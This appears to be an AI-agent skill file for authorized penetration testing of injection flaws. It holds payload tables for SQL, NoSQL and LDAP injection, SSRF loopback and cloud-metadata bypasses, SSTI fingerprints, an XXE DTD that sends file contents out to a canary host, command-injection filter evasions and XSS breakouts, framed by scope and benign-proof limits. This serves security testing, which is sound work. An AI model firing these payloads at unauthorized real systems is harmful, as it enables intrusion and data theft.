---
name: injection_engine
description: Use when probing input handling for server-side execution - SQL/NoSQL/LDAP
  injection, context-aware reflected, stored and DOM-based XSS, SSRF including internal
  ranges and cloud metadata endpoints, SSTI template expressions, XXE, and OS command
  injection.
---

# Injection engine (P5)

Where input crosses a trust boundary and gets interpreted: SQL/NoSQL/LDAP,
XSS, SSRF, SSTI, XXE, OS command. You know the classes; this is how the
harness keeps the process honest.

## The way

- Baseline first, one variable at a time, encode ladder weakest-first —
  the rung that produced the delta is part of the finding.
- Context before payload: classify where the input lands (SQL string or
  identifier, HTML body/attribute/JS string, URL, template, XML). The
  context picks the probe; a payload without its context is log noise.
- Signals are measured, not eyeballed: diffs through the `20` harness,
  boolean TRUE-vs-FALSE pairs, timing as medians over N >= 5.
- Blind classes are proved by effect — OOB canary, boolean delta, timing.
  "No error" is never "not vulnerable", and no callback is no claim.
- SSRF proves reachability, not pivoting: one benign metadata field at
  most, never credentials; a 405/token error on IMDS is itself the
  finding. Internal ranges only in scope.
- Filtered probes are data — map the filter, don't declare failure.
- Engine, DBMS and parser fingerprints from errors and evaluations feed
  `70`.
- Three generations without signal -> log the negative, move on.

## Handoffs

Execution escalation -> `45`; blind machinery -> `20`; XSS impact ->
`55`; versions -> `70`; API-shaped sinks -> `60`.

## Tools

`sqli_probe.py` (time probes RoE-gated), `xss_context.py` (offline);
sqlmap only with the safe-flag caps in the reference. Payload trees and
the context matrix live in `references/`.

---

## Reference Module: `sql-injection-trees`

# SQL injection trees (CWE-89, CWE-90)

Full probe trees per class. All payloads are canonical textbook forms against
the parameter's original value (`<v>` placeholder). Always: baseline pair
first, one variable at a time, evidence pair per family.

## 1. Probe order (canonical set — mirrors `scripts/sqli_probe.py`)

| # | Probe | Payload (`<v>` = original value) | What a delta means |
|---|-------|----------------------------------|--------------------|
| 1 | single quote | `<v>'` | quote breaks out of a string literal |
| 2 | double quote | `<v>"` | double-quoted identifier/string context |
| 3 | paren | `<v>(` | expression/subquery context, syntax error |
| 4 | comment | `<v>'-- -` | quote + trailing-comment swallow |
| 5 | boolean TRUE | `<v>' AND '1'='1'-- -` | boolean oracle, TRUE side |
| 6 | boolean FALSE | `<v>' AND '1'='2'-- -` | boolean oracle, FALSE side |
| 7 | sleep (gated) | `<v>' AND SLEEP(5)-- -` | time oracle; requires `--allow-time` RoE gate |

Numeric context (no quote wrapping): drop the quote (`<v> AND 1=1` /
`<v> AND 1=2`).

## 2. Error-based signatures per DBMS family

| Family | Response signature (substring to grep) | Notes |
|---|---|---|
| MySQL / MariaDB | `you have an error in your SQL syntax`, `Warning: mysql_`, `MariaDB` | comments `-- `, `#`, version comment `/*!50000 */` |
| PostgreSQL | `ERROR:  syntax error at or near`, `unterminated quoted string`, `PG::SyntaxError` | `::` cast errors, `information_schema` readable |
| MSSQL | `Unclosed quotation mark after the character string`, `Microsoft SQL`, `SqlClient` | `CONVERT`/`CAST` int-conversion errors; `WAITFOR` time oracle |
| Oracle | `ORA-01756: quoted string not properly terminated`, `ORA-00936: missing expression`, `ORA-00942: table or view does not exist` | single-quote strings only; `UTL_*` is escalation, not probing |
| SQLite | `unrecognized token`, `SQLITE_ERROR`, `near "...": syntax error` | no `SLEEP()`; heavy-compute time oracle only (below) |

Any signature in a probe-delta response = D1 error-based finding. Record the
verbatim error text; it doubles as the DBMS fingerprint for `70-exploit-intel`.

## 3. Boolean delta tree

1. Send TRUE `<v>' AND '1'='1'-- -` and FALSE `<v>' AND '1'='2'-- -`.
2. Strong signal: TRUE response byte-identical to baseline (sha256 equal)
   AND FALSE differs in status/len/sha.
3. Weak signal: TRUE and FALSE differ from each other but neither matches
   baseline — check for pagination/random-id noise first (false-positive
   checklist), keep as D1 hint.
4. Escalate the oracle for impact proof only: `<v>' AND (SELECT SUBSTR(
   version(),1,1))='8'-- -` style one-character predicates; stop at
   proving the oracle reads DBMS state. No table/data enumeration unless the
   engagement authorizes data access in writing.

## 4. Time-based tree (RoE-gated, last resort)

- Median of N>=5 on both sides; single-shot timing is never evidence.
- Payloads: MySQL `' AND SLEEP(5)-- -` (or `BENCHMARK`); PostgreSQL
  `'; SELECT pg_sleep(5)--`; MSSQL `'; WAITFOR DELAY '0:0:5'--`; Oracle
  `' AND 1=DBMS_PIPE.RECEIVE_MESSAGE('a',5)--`; SQLite (no sleep) heavy
  compute `AND 1=LIKE('ABCDEFG',UPPER(HEX(RANDOMBLOB(100000000))))`.
- Verdict rule: probe median - baseline median >= 4s across two replay runs.

## 5. UNION discovery tree

1. Column count: `<v>' ORDER BY 1-- -`, increment `ORDER BY 2`, ... until
   error/delta. Last working n = column count.
2. Pad: `<v>' UNION SELECT NULL,NULL,...,NULL-- -` (n NULLs) until the row
   renders (no type errors during discovery).
3. Echoed column: replace one NULL at a time with `'rj-pt-canary'` until the
   canary renders — that column accepts strings.
4. Impact proof: `UNION SELECT NULL,version(),NULL-- -` (or `current_user`)
   — version + current_user is the proof; data-row extraction is out unless
   authorized.
5. MySQL/MSSQL note: check the original query column count via
   `UNION SELECT NULL` errors before assuming ORDER BY worked.

## 6. NoSQL operator tree (MongoDB-style, CWE-943 adjacent)

| Goal | Bracket-notation (form) | JSON body |
|---|---|---|
| auth bypass | `username[$ne]=x&password[$ne]=x` | `{"u":{"$ne":""},"p":{"$ne":""}}` |
| range oracle | `field[$gt]=a` ... `[$lt]=z` | `{"f":{"$gt":"a"}}` |
| regex oracle | `field[$regex]=^a` | `{"f":{"$regex":"^a"}}` |
| JS time oracle (gated) | `where[$where]=sleep(5000)` (legacy servers) | `{"$where":"sleep(5000)"}` |

`$where` runs server-side JavaScript and is deprecated on modern MongoDB;
treat absence as inconclusive, never as "secure".

## 7. LDAP injection tree (CWE-90)

- Meta-characters: `*` `(` `)` `\` NUL — send each alone first, watch for
  LDAP filter errors (`malformed filter`, `Bad search filter`).
- Canonical break: `*)(uid=*))%00` against a login/search filter using the
  attribute the app queries (`uid`, `sAMAccountName`, `mail`).
- Boolean oracle: `a*` (matches) vs `zzzz*` (no match) response delta when
  the result count/shape is observable.
- Blind: behavior deltas only (HTTP status/body length); no LDAP data
  enumeration without authorization.

## 8. ORM-specific bypass notes

- Stacked queries (`; SELECT ...`) are disabled by default in most ORM/DB
  driver stacks — do not burn requests on them; use comment termination
  (`'-- -`) inside the existing statement instead.
- ActiveRecord (Ruby): `.order(params[:sort])` / `.pluck` interpolation ->
  ORDER BY injection; probe `ORDER BY id),(select version()` style only
  after plain sort tampering shows a delta; boolean via `CASE WHEN`.
- Django: `raw()` and `extra(where=...)` string interpolation; ORM filter
  layer is parameterized — probe only surfaces that build SQL text.
- Hibernate HQL: no UNION, no stacked queries; entity properties only;
  boolean predicates work (`' and '1'='1`); `QueryException` text is the
  fingerprint.
- Node (Sequelize/TypeORM): operator confusion when `{"$gt":...}` keys or
  `sequelize.literal()` reach the query layer unfiltered; JSON-body params
  are the usual entry.

## 9. Negative results

Three generations without signal on one surface: log surface, probe set,
and negative outcome in the run notes (feeds the report coverage statement),
then move on.


---

## Reference Module: `ssrf-metadata`

# SSRF and metadata (CWE-918)

Alias tables, metadata URL families (documented example paths only),
redirect method, and safe impact-proof rules.

## 1. Sink identification checklist

- URL parameters: `url=`, `fetch=`, `import=`, `src=`, `callback=`,
  `webhook=`, `avatar=`, `image_url=`, `remote=`, `feed=`, `endpoint=`.
- Features: import-from-URL, feed readers, webhooks configurators, "attach by
  link", avatar/profile picture by URL, PDF generators, HTML-to-image/thumbnail
  services, SAML metadata fetchers, OAuth `redirect_uri` backend validation.
- Proxy-like endpoints: PDF export, screenshot, "preview link", archive/zip
  from URL.
- Discovery evidence: parameter names from P1 inventory + JS bundle greps for
  `fetch(`, `axios.get(`, `requests.get`, server-side `HttpWebRequest`.

## 2. Localhost / internal alias table

| Form | Example | Defeats |
|---|---|---|
| short loopback | `http://127.1/` | blocklists matching `127.0.0.1` string |
| padded decimal | `http://127.000.000.001/` | regex `^127\.0\.0\.1$` |
| wildcard bind | `http://0.0.0.0/` | blocklists that forget 0.0.0.0 |
| IPv6 loopback | `http://[::]/`, `http://[::1]/` | IPv4-only checks |
| hex | `http://0x7f000001/` | decimal-only parsing |
| octal | `http://0177.0.0.1/` | decimal-only parsing |
| decimal dword | `http://2130706433/` | string blocklists entirely |
| hex dword (metadata) | `http://0xA9FEA9FE/` (= 169.254.169.254) | `169.254` string checks |
| decimal dword (metadata) | `http://2852039166/` | same |
| case/trailing dot | `http://LOCALHOST:8080/`, `http://127.0.0.1./` | case-sensitive lists |

Internal ranges beyond loopback: only hosts/CIDRs inside the engagement scope
file; incidental internal services are recorded as observations, never probed.

## 3. Metadata URL families (documented example paths only)

Proof = reachability plus at most one benign field (e.g. `hostname`). NEVER
retrieve credentials, instance-identity documents, or user data.

| Cloud | Base | Documented example paths | Auth quirk |
|---|---|---|---|
| AWS IMDSv1 | `http://169.254.169.254/latest/` | `meta-data/hostname`, `meta-data/iam/security-credentials/` (path exists — do NOT fetch contents) | v1 = plain GET; a `405`/token error indicates IMDSv2 |
| AWS IMDSv2 | same | `api/token` (PUT, `X-aws-ec2-metadata-token-ttl-seconds`) | token required; hop-limit often blocks proxying |
| GCP | `http://metadata.google.internal/computeMetadata/v1/` | `instance/hostname` | requires header `Metadata-Flavor: Google` |
| Azure | `http://169.254.169.254/metadata/instance` | `?api-version=2021-02-01` | requires header `Metadata: true` |

Header-based bypass attempts (record attempts even when they fail — failed
attempts are coverage evidence):

- `Host: 169.254.169.254` override when the app proxies by Host.
- Absolute-form request line: `GET http://169.254.169.254/latest/meta-data/
  HTTP/1.1` through a misconfigured forward proxy.
- `X-Forwarded-For` / `X-Real-IP` spoofing to pass an SSRF "protection"
  middleware that allowlists proxy hops.
- Redirect: the app fetches an engagement-controlled URL (on the `20`
  listener) that returns `302 Location: http://169.254.169.254/...` —
  defeats allowlists applied only to the initial URL.

## 4. Procedure

1. External canary first: point the sink at a `20`-listener URL labeled with
   the canary (`http://canary.rj-pt.example/p5/ssrf/<surface>`); a DNS/HTTP
   hit = blind SSRF D1 without touching internal space.
2. Alias ladder (section 2) against loopback ports of in-scope services; map
   which internal HTTP services answer (status/headers) — record, do not
   attack; hand the map to the report and to `70-exploit-intel` if versions
   are fingerprintable.
3. Metadata probes (section 3) — benign field only.
4. Redirect chain (section 3) when direct forms are filtered.
5. Scheme probing: `file://`, `gopher://`, `dict://` reachability is recorded
   as transport findings; do not read local files via SSRF unless explicitly
   in scope (that is an impact proof for `45` with operator authorization).

## 5. Safe impact-proof rules

- Reachability + one benign field (hostname) is a complete, proportionate
  impact proof. A credential path existing (200 on the directory listing) is
  stated as exposure, not exploited.
- No mass port scanning through the SSRF; a short, hand-picked port list per
  known internal host only (22, 80, 443, 3000, 6379, 8006, 8080, 9200 style),
  serial, <= 2 retries.
- Blind interactions land on the `20` OOB listener with canary labels;
  a DNS hit is D1, replay makes it D2.
- Every probe pair saved as `evidence/p5-ssrf-<surface>-<seq>.{req,resp}.txt`;
  for blind hits, archive the listener log excerpt alongside.

## 6. Handoffs

- Internal service versions discovered via SSRF -> `10` fingerprints ->
  `70-exploit-intel`.
- Internal admin panels reachable only through SSRF -> observation in the
  report; attacking them needs scope amendment.
- Blind machinery -> `20-traffic-manipulation`.


---

## Reference Module: `ssti-xxe-cmdi`

# SSTI, XXE, and OS command injection tables

Engine fingerprint decision table, XXE payload family, and command
delimiter + filter-evasion tables. All payloads are canonical textbook forms;
command slots are limited to the benign proof catalog (`id`, `whoami`,
`hostname`, canary echo).

## 1. SSTI engine fingerprint (CWE-1336)

Never attempt execution on first contact; fingerprint, confirm with a benign
render, then hand the engine to `45-rce-exploitation` for escalation.

### 1.1 First-round probes

| Probe | Result | Engines |
|---|---|---|
| `{{7*7}}` | `49` | Jinja2, Twig, Pebble, Angular (client-side) |
| `${7*7}` | `49` | FreeMarker, Velocity, Mako, JSP EL, Thymeleaf (inline) |
| `<%= 7*7 %>` | `49` | ERB (Ruby), EJS (Node) |
| `<% 7*7 %>` | error-free acceptance, no output | ERB/EJS scriptlet (statement context) |
| `#{7*7}` | `49` | JSF EL, Ruby interpolation, Pug, Pebble alt |
| `*{7*7}` | `49` | Thymeleaf |
| `${{7*7}}` | `49` | mixed-delimiter stacks (rare) |
| probe echoed literally | unchanged | no engine, or escaping — negative |

### 1.2 Discrimination round

| Follow-up | Result | Conclusion |
|---|---|---|
| `{{7*'7'}}` | `7777777` | Jinja2 (Python string repeat) |
| `{{7*'7'}}` | `49` | Twig (PHP numeric cast) |
| `${7*"7"}` | `7777777` | FreeMarker (string repeat) |
| `<%= 7*7 %>` in a `.html` route with Sinatra/Rails | `49` | ERB |
| `#set($x=7*7)${x}` (with `$x` = `x`) | `49` | Velocity |
| `${"a".getClass()}` renders class info | yes | Java-family (FreeMarker/Velocity) |
| `{{ config }}` / `{{ self }}` renders object repr | yes | Jinja2 sandbox absent |

Record engine + version (headers, error pages, `10` fingerprints) and hand to
`70-exploit-intel` for CVE correlation and to `45` for escalation.

## 2. XXE payload family (CWE-611)

Surfaces: XML/SOAP endpoints, SVG and `.docx`/`.xlsx`-style uploads, SAML
assertions, RSS importers. Fingerprint the parser first (modern libxml2
defaults external entities OFF; .NET `XmlDocument` with `XmlUrlResolver` and
Java `DocumentBuilder`/SAX are the classic reachable ones).

### 2.1 In-band file read (proof = hostname or canary file)

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///etc/hostname"> ]>
<r>&xxe;</r>
```

Windows-family target: `file:///c:/windows/win.ini` is the canonical
existence proof. No system data beyond proof (no keys, no user data).

### 2.2 Blind / OOB via hosted DTD

Request (entity names must differ from the local ones):

```xml
<?xml version="1.0"?>
<!DOCTYPE r [
  <!ENTITY % remote SYSTEM "http://canary.rj-pt.example/oob/xxe.dtd">
  %remote;
]>
<r>x</r>
```

DTD hosted on the `20` listener (`oob/xxe.dtd`):

```xml
<!ENTITY % file SYSTEM "file:///etc/hostname">
<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://canary.rj-pt.example/oob/xxe?d=%file;'>">
%eval;
%exfil;
```

The DNS/HTTP hit carrying `/etc/hostname` (<= 200 chars, benign) is the D1
proof; replay for D2. File choice stays in the benign catalog — hostname or
an operator-planted canary file only.

### 2.3 Error-based

```xml
<?xml version="1.0"?>
<!DOCTYPE r [ <!ENTITY xxe SYSTEM "file:///nonexistent-rj-pt-canary"> ]>
<r>&xxe;</r>
```

Parser error text leaking the resolved path/system id confirms entity
resolution without any exfiltration channel.

### 2.4 Expect-header OOB (no DTD hosting possible)

`<!ENTITY xxe SYSTEM "expect://id">` is NOT used — expect:// leaks command
output in headers and is out of the benign catalog; use 2.2/2.3 instead.

## 3. OS command injection (CWE-78)

### 3.1 Delimiter table per shell

| Shell | Separators | Notes |
|---|---|---|
| sh/bash/ash/dash | `;` `\|` `&&` `\|\|` backtick `` `cmd` `` `$(cmd)` newline `%0a` (and `%0d%0a`) | `$()` nests; backticks do not |
| cmd.exe | `&` `&&` `\|` `\|\|` | `%0d%0a` unreliable; `^` is the escape char |
| PowerShell | `;` `\|` `&&` (7+) `\|\|` `$(...)` | backtick is the escape char |

### 3.2 Detection set (bounded, canary echo — mirrors `45`'s rce_verify.py)

`;echo <canary>` / `|echo <canary>` / `&&echo <canary>` / `||echo <canary>` /
newline+`echo <canary>` / `` `echo <canary>` `` / `$(echo <canary>)` /
`;printf %s <canary>`.

Blind/DNS-safe: `ping -c 1 -W 1 <canary-domain>` (one packet, bounded wait)
verified on the `20` OOB listener — never a ping flood, never a reverse shell.

### 3.3 Filter-evasion ladder (only after plain separators fail)

1. Quoting: `wh"o"ami`, `wh'o'ami` — defeats keyword blocklists.
2. Backslash: `wh\oami` — same, for quote-stripping filters.
3. Spaceless: `${IFS}`, `$IFS$9`, `<` redirect form, brace group `{ping,-c,1,-W,1,host}`.
4. Case: `WHO""AMI`, `WhOaMi` — defeats case-sensitive blocklists.
5. Charset/hex: `$(printf '\167\150\157\141\155\151')` — defeats most literal lists.
6. Re-encoding the separator: `%0a`, `%0d%0a`, double-encode when the app
   decodes twice.
7. Time-based fallback: `;sleep 5` (or `& sleep 5 &`) under the RoE gate,
   medians N>=5.

Record the exact ladder rung that worked; the rung is part of the finding and
of the remediation note (blocklists failed at that layer).

### 3.4 Windows-family specifics

- `&` chains regardless of prior command success; `&&` needs success.
- Caret escaping: `who^ami` defeats naive `whoami` blocklists.
- Quotes: `ne""t user` style; `cmd /c` wrappers when the sink spawns
  `cmd /c <input>`.

## 4. Evidence and limits

- Every confirmed class here produces a finding with: probe, verbatim
  response delta, engine/shell fingerprint, and encode rung.
- Execution escalation (SSTI->RCE, XXE beyond file-read proof, command
  injection proof-of-execution flow) is `45-rce-exploitation` territory with
  operator authorization; this skill stops at confirmed class + fingerprint.


---

## Reference Module: `xss-contexts`

# XSS contexts (CWE-79)

Context -> breakout matrix, sink list, and procedures. Payloads are canonical
inert `alert(1)`-class forms; replace `alert(1)` with an engagement canary
render where a lighter proof is wanted.

## 1. Context -> breakout matrix

Classify with `scripts/xss_context.py` (marker-based, heuristic). Only use
the breakout row for the classified context.

| Context | How to confirm | Canonical breakouts |
|---|---|---|
| html-body | marker sits between `>` and `<` in markup | `<svg onload=alert(1)>`, `<img src=x onerror=alert(1)>`, `<script>alert(1)</script>` (last resort; CSP often blocks) |
| attribute, double-quoted | marker inside `attr="..."` | `" autofocus onfocus=alert(1) x="`, `" onmouseover=alert(1) x="` |
| attribute, single-quoted | marker inside `attr='...'` | `' autofocus onfocus=alert(1) x='`, `' onmouseover=alert(1) x='` |
| attribute, unquoted | marker is a bare attr value | `onfocus=alert(1) autofocus` (space breaks out of the value) |
| js-string, single-quoted | marker inside `'...'` in script | `'-alert(1)-'`, `';alert(1);//`, `\';alert(1);//` (if quotes are escaped) |
| js-string, double-quoted | marker inside `"..."` in script | `"-alert(1)-"`, `";alert(1);//`, `\";alert(1);//` (if quotes are escaped) |
| js-template | marker inside backticks | `${alert(1)}` |
| js-code (raw) | marker outside string literals | `;alert(1);//` |
| url, scheme position | marker starts an href/src/action value | `javascript:alert(1)//` (works only if the value is used for navigation/script src) |
| url, param position | marker inside `?a=b&...` of a URL attr | `&n=<svg onload=alert(1)>` (URL-encode once or twice per ladder) |
| html-comment | marker inside `<!--...-->` | `--!><svg onload=alert(1)>` |

Notes:
- Escaped-quote contexts (`\'` echoed back): use the backslash-escape row —
  the escaped quote closes nothing, the payload follows.
- If `<` and `>` are HTML-encoded but quotes are not, attribute contexts still
  break out; body context does not. Record which characters survive.

## 2. Encode-decode ladder

raw -> URL-encode once (`%3Csvg...`) -> URL-encode twice -> Unicode/UTF-7
legacy (`%u003C`) -> `%00` termination attempts. Record the rung that
executes; re-test from a clean session for D2.

## 3. DOM sink list (from the crawled JS bundle)

Sinks (write/exec):

- `innerHTML`, `outerHTML`, `insertAdjacentHTML`
- `document.write`, `document.writeln`
- `eval`, `Function(...)`, string-argument `setTimeout(...)`/`setInterval(...)`
- `location`, `location.href`, `location.assign`, `location.replace`
  (including `javascript:` URL assignment)
- jQuery: `$(`userInput`)` selector injection, `.html(payload)`,
  `.append(payload)`, `$(location.hash)` patterns
- Framework-specific: AngularJS client-side template injection in interpolated
  text, Vue `v-html`, React `dangerouslySetInnerHTML`

Sources (read): `location.hash`, `location.search`, `document.referrer`,
`document.URL`, `window.name`, `postMessage` data, `localStorage` values
written by another page/param.

Pair each source->sink path in the finding; a sink with no reachable source
is not a finding.

## 4. Reflected procedure

1. Send a unique canary (`rj-pt-<engagement>-<nonce>`) as the parameter value.
2. Save the response; classify context with `scripts/xss_context.py`.
3. Choose the single breakout row for that context; send the minimal payload.
4. Verify an inert execution marker (alert/canary render); capture the pair.
5. Replay from a clean session for D2; run the false-positive checklist
   (cache-bust, second session, `20`-harness diff).

## 5. Stored procedure

1. Identify storage: profile fields, comments, names, filenames, tickets.
2. Plant the context-matched payload under a test account (never a real user;
  never real user data).
3. View the stored value in every renderer that consumes it (profile page,
  admin list, search result, email preview) — the admin-side render is often
  the unfiltered one.
4. Re-check with a second role (victim context) when the impact claim needs it.
5. Delete the stored payload after D2 and record the deletion in the finding
  (cleanup discipline).

## 6. DOM procedure

1. Map source->sink in the JS bundle (sink list above).
2. Deliver the source value (`location.hash` fragment, `postMessage` with the
   page's expected shape/origin).
3. Prove with an inert marker; headless confirmation belongs to the browser
   automation in the assessment container, screenshot into evidence.
4. `postMessage` without origin checks also routes to
   `55-client-side-attacks` for chaining.

## 7. Polyglot notes

- A polyglot is a last resort when the context is unknown or filtered; it is
  noisy in logs. Prefer classification first.
- Canonical minimal polyglot shape (textbook): a quote/angle-breaking prefix
  plus `onerror`/`onload` handler and a `javascript:` fallback tail, e.g.
  `jaVasCript:/*-/*`/*\`/*'/*"/**/(/* */oNcliCk=alert() )//%0D%0A//</style>
  </script>">` — use only with operator approval, it trips WAFs and pollutes
  logs (note for `85-logging-monitoring`).
- For attribute contexts, polyglots that open a new attribute
  (`autofocus onfocus=`) survive more encoders than tag-openers.

## 8. Limits and handoffs

- CSP (`script-src`) from the P2 baseline caps what executes; state finding
  limits exactly (e.g. "HTML injection, script execution blocked by CSP").
- Session theft / CSRF-chain / OAuth-redirect abuse of an accepted XSS goes to
  `55-client-side-attacks`, not this skill.

